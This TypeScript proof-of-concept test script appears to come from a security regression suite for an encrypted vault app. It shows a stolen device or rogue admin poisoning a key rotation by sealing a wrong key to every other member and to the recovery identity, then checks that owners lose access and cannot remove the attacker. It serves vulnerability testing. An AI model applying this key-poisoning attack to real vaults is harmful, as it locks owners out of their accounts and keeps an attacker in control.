// @ts-nocheck PoC script, run as is by the round-6 tests
// R6-D: one key.rotate from a stolen phone (before removal) or any malicious admin, with a correct
// key check but a WRONG key sealed to every other device and to the recovery identity. Replay can't
// open sealed keys, so it applies and becomes the vault key. Goes through the honest agent
// (planAppend). Each PASS line is a step of the attack that still works; the fix leaves none.
import { addDevice, agentAppend, build, check, crypto, dev, entry, found, now, open, random, rec, st, status } from './lib.ts';
const SRC = new URL('../../../src/vault', import.meta.url).href;
const recovery = await import(`${SRC}/recovery.ts`);
const bytesMod = await import(`${SRC}/bytes.ts`);
const sealProof = await import(`${SRC}/sealProof.ts`);

const F = dev(); // founder phone, later stolen
const N = dev(); // owner's tablet
const v = found(F);
const { vaultId, logs } = v;
addDevice(vaultId, logs, F, N, 'admin', 'tablet');
// Owner sets a recovery phrase, adds accounts.
const phrase = recovery.generateRecoveryPhrase(random);
{
  const s = st(vaultId, logs);
  const e = recovery.buildRecoverySetFromPhrase(s, N, { phrase, currentKey: open.openVault(s, N).currentKey, random, time: now() });
  agentAppend(vaultId, logs, [e.entry ?? e]);
}
for (let i = 0; i < 3; i++) {
  const s = st(vaultId, logs);
  agentAppend(vaultId, logs, [build.buildAccountPut(s, N, { account: build.newAccountId(random), record: rec(`Bank${i}`), currentKey: open.openVault(s, N).currentKey, random, time: now() })]);
}

// Thief: an ordinary key.rotate, then the sealed keys of everyone but itself replaced by a wrong key.
let bad;
{
  const s = st(vaultId, logs);
  const r = build.buildKeyRotate(s, F, { currentKey: open.openVault(s, F).currentKey, random, time: now() });
  const { sig, ...unsigned } = r.entry as any;
  const wrong = build.newVaultKey(random);
  for (const id of Object.keys(unsigned.body.keys)) {
    if (id === F.deviceId) continue;
    const x = id === s.recovery!.deviceId ? s.recovery!.x : s.members[id]!.x;
    unsigned.body.keys[id] = crypto.sealKey(wrong, bytesMod.fromBase64Url(x), { vault: vaultId, epoch: unsigned.body.epoch, to: id });
  }
  bad = entry.signEntry(unsigned, F);
  const plan = agentAppend(vaultId, logs, [bad]);
  console.log('agent took the poisoned rotation:', plan.changed.length > 0, status(plan.state, bad));
}
const s = st(vaultId, logs);
const accountsOf = (state, who) => Object.keys(open.openVault(state, who).accounts).length;

let nCodes = 0;
try { nCodes = accountsOf(s, N); } catch {}
check('the owner\'s tablet shows no codes', nCodes !== 3, `it shows ${nCodes}`);

// The thief holds the key and sees its own seals are fine; the victims prove theirs bad.
const recoveryKeys = recovery.recoveryKeysFromPhrase(phrase, vaultId);
const proofN = sealProof.makeSealProof(bad, N, s.keyChecks);
const proofR = sealProof.makeSealProof(bad, recoveryKeys, s.keyChecks);
const provenN = proofN !== null && sealProof.sealProofValid(proofN, bad, s.members[N.deviceId].x, s.keyChecks);
const provenR = proofR !== null && sealProof.sealProofValid(proofR, bad, s.recovery.x, s.keyChecks);
check('nobody can prove the seals bad', !provenN || !provenR);

// Restore on the poisoned folder gives a device that shows the codes.
let restoredCodes = 0;
try {
  const d = dev();
  const restored = recovery.restoreWithPhrase(s, { phrase, device: { edPublic: d.edPublic, xPublic: d.xPublic, deviceId: d.deviceId }, name: 'new', random, time: now() });
  const copy = Object.fromEntries(Object.entries(logs).map(([k, l]) => [k, [...l]]));
  agentAppend(vaultId, copy, [restored.entry]);
  agentAppend(vaultId, copy, [build.buildDeviceHello(st(vaultId, copy), d, now(), entry.entryHash(restored.entry))]);
  restoredCodes = accountsOf(st(vaultId, copy), d);
} catch {}
check('restoring with the recovery phrase shows no codes', restoredCodes !== 3, `it shows ${restoredCodes}`);

// Before removal, the honest device on the last key it opens.
let removed = null;
try {
  const removal = build.buildDeviceRemove(s, N, { device: F.deviceId, currentKey: open.openVault(s, N).currentKey, random, time: now() });
  const plan = agentAppend(vaultId, logs, [removal.entry]);
  removed = status(plan.state, removal.entry) === 'applied' ? plan.state : null;
} catch {}
check('the owner cannot remove the thief', removed === null);

if (removed) {
  const fresh = (who) => {
    try {
      const opened = open.openVault(removed, who);
      return opened.readOnly === null && opened.epoch === removed.epoch ? Object.keys(opened.accounts).length : -1;
    } catch {
      return -1;
    }
  };
  check('the thief still opens the current key', fresh(F) >= 0);
  check('the owner\'s tablet still lacks a fresh key with every account', fresh(N) !== 3);
  check('the recovery phrase still lacks a fresh key with every account', fresh(recoveryKeys) !== 3);
}
